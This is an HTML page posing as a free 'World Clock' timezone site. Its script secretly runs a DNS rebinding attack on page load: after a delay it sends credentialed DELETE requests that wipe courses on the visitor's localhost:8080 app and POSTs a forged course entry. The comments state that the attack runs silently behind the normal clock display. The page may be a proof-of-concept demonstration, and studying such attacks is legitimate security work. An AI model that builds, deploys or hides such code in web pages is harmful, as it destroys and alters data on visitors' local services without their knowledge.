<!DOCTYPE html>
<html>
<head>
  <title>World Clock - Time Zones</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      max-width: 800px;
      width: 100%;
    }
    h1 {
      color: #2c3e50;
      margin-bottom: 30px;
      text-align: center;
    }
    .clock-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-top: 30px;
    }
    .clock-card {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 25px;
      border-radius: 15px;
      text-align: center;
      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
    }
    .city-name {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 10px;
    }
    .time {
      font-size: 32px;
      font-weight: bold;
      font-family: 'Courier New', monospace;
    }
    .date {
      font-size: 14px;
      opacity: 0.9;
      margin-top: 8px;
    }
    .loading {
      text-align: center;
      padding: 40px;
      color: #7f8c8d;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #667eea;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 12px;
      color: #95a5a6;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🌍 World Clock</h1>

    <div class="loading" id="loading">
      <div class="spinner"></div>
      <p>Synchronizing time zones...</p>
    </div>

    <div class="clock-grid" id="clocks" style="display: none;">
      <div class="clock-card">
        <div class="city-name">New York</div>
        <div class="time" id="ny-time">--:--:--</div>
        <div class="date" id="ny-date">Loading...</div>
      </div>
      <div class="clock-card">
        <div class="city-name">London</div>
        <div class="time" id="london-time">--:--:--</div>
        <div class="date" id="london-date">Loading...</div>
      </div>
      <div class="clock-card">
        <div class="city-name">Tokyo</div>
        <div class="time" id="tokyo-time">--:--:--</div>
        <div class="date" id="tokyo-date">Loading...</div>
      </div>
      <div class="clock-card">
        <div class="city-name">Sydney</div>
        <div class="time" id="sydney-time">--:--:--</div>
        <div class="date" id="sydney-date">Loading...</div>
      </div>
    </div>

    <div class="footer">
      © 2026 World Clock - Free timezone converter
    </div>
  </div>

  <script>
    // ==========================================
    // DNS REBINDING ATTACK CONFIGURATION
    // ==========================================

    const ATTACK_CONFIG = {
      // Port where victim runs the vulnerable app
      TARGET_PORT: '8080',

      // Wait time for DNS rebinding to take effect (in milliseconds)
      // DNS should rebind from attacker IP to 127.0.0.1 during this delay
      REBIND_DELAY: 8000, // 8 seconds

      // Target endpoints to attack
      ENDPOINTS: {
        delete: [
          { url: 'http://localhost:8080/api/courses/1', name: 'course 1' },
          { url: 'http://localhost:8080/api/courses/2', name: 'course 2' },
          { url: 'http://localhost:8080/api/courses/3', name: 'course 3' },
          { url: 'http://localhost:8080/api/courses/4', name: 'course 4' }
        ],
        create: {
          url: 'http://localhost:8080/api/courses',
          data: {
            name: 'External Attack',
            code: 'EXT-ATK',
            facultyName: 'Remote Attacker',
            version: '2025.01.0',
            description: 'Created via DNS rebinding from external domain'
          }
        }
      }
    };

    // ==========================================
    // DNS REBINDING ATTACK IMPLEMENTATION
    // ==========================================

    async function executeRebindAttack() {
      console.log('[DNS Rebinding] Phase 1: Page loaded from attacker server');
      console.log('[DNS Rebinding] Current hostname:', window.location.hostname);

      // Phase 1: Page is served from attacker's server
      // DNS currently points to: Attacker's Vercel IP

      // Wait for DNS TTL to expire and rebind to localhost
      console.log(`[DNS Rebinding] Phase 2: Waiting ${ATTACK_CONFIG.REBIND_DELAY/1000}s for DNS to rebind to 127.0.0.1...`);

      await new Promise(resolve => setTimeout(resolve, ATTACK_CONFIG.REBIND_DELAY));

      // Phase 2: DNS has now rebinded
      // DNS now points to: 127.0.0.1
      // Browser still thinks we're on the same origin!

      console.log('[DNS Rebinding] Phase 3: DNS rebind complete, attacking localhost...');

      try {
        // Attack 1: Delete courses using localhost URLs directly
        for (const target of ATTACK_CONFIG.ENDPOINTS.delete) {
          try {
            console.log(`[Attack] Deleting ${target.name}...`);
            const response = await fetch(target.url, {
              method: 'DELETE',
              mode: 'cors',
              credentials: 'include'
            });
            console.log(`[Attack] Deleted ${target.name}: ${response.status}`);
          } catch (error) {
            console.log(`[Attack] ${target.name} error:`, error.message);
          }

          // Small delay between attacks
          await new Promise(r => setTimeout(r, 400));
        }

        // Attack 2: Create malicious course
        try {
          console.log('[Attack] Creating malicious entry...');
          const response = await fetch(ATTACK_CONFIG.ENDPOINTS.create.url, {
            method: 'POST',
            mode: 'cors',
            credentials: 'include',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(ATTACK_CONFIG.ENDPOINTS.create.data)
          });
          console.log(`[Attack] Created entry: ${response.status}`);
        } catch (error) {
          console.log('[Attack] Create error:', error.message);
        }

        console.log('[DNS Rebinding] Attack sequence complete!');
      } catch (error) {
        console.error('[DNS Rebinding] Attack failed:', error);
      }
    }

    // ==========================================
    // LEGITIMATE CLOCK FUNCTIONALITY
    // ==========================================

    function updateClocks() {
      const zones = [
        { id: 'ny', tz: 'America/New_York' },
        { id: 'london', tz: 'Europe/London' },
        { id: 'tokyo', tz: 'Asia/Tokyo' },
        { id: 'sydney', tz: 'Australia/Sydney' }
      ];

      zones.forEach(zone => {
        const now = new Date();
        const timeStr = now.toLocaleTimeString('en-US', {
          timeZone: zone.tz,
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });
        const dateStr = now.toLocaleDateString('en-US', {
          timeZone: zone.tz,
          weekday: 'short',
          month: 'short',
          day: 'numeric'
        });

        const timeEl = document.getElementById(`${zone.id}-time`);
        const dateEl = document.getElementById(`${zone.id}-date`);

        if (timeEl) timeEl.textContent = timeStr;
        if (dateEl) dateEl.textContent = dateStr;
      });
    }

    // ==========================================
    // INITIALIZATION
    // ==========================================

    window.addEventListener('load', () => {
      // Show clocks after brief loading
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('clocks').style.display = 'grid';
        updateClocks();
        setInterval(updateClocks, 1000);
      }, 1500);

      // Execute DNS rebinding attack in background
      // This runs silently while user sees normal clock
      executeRebindAttack();
    });
  </script>
</body>
</html>
